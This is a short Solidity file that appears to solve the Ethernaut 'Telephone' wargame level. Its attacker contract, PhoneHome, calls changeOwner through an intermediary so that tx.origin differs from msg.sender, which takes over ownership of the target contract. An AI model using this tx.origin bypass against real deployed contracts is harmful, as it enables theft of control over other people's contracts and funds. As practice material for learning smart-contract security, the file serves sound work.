/* This contract has a check for making sure tx.origin != msg.sender
This means we need to call from a different contract which will use the msg.sender field and our EOA address will be tx.origin.

function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
  
  */
  
  
  // SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "hardhat/console.sol";

//First we create an abstract of the contract and function we want to call.
//Create interface/ABI of the challenge address??
interface Telephone {
    function changeOwner(address _owner) external;
    function owner() external returns(address);
}

contract PhoneHome {

       

    //set address of ethernaut instance and create local variable of instance
    address ethernautInstance = 0xeB433FD2e97734B30b0eCf0dbe8491c291544705; 
    Telephone challenge = Telephone(ethernautInstance);
    
    //this will call the contract challenge for us when we call from an EOA
    function phoneHome(address _address) public
    {
        challenge.changeOwner(_address);
    }
    

}
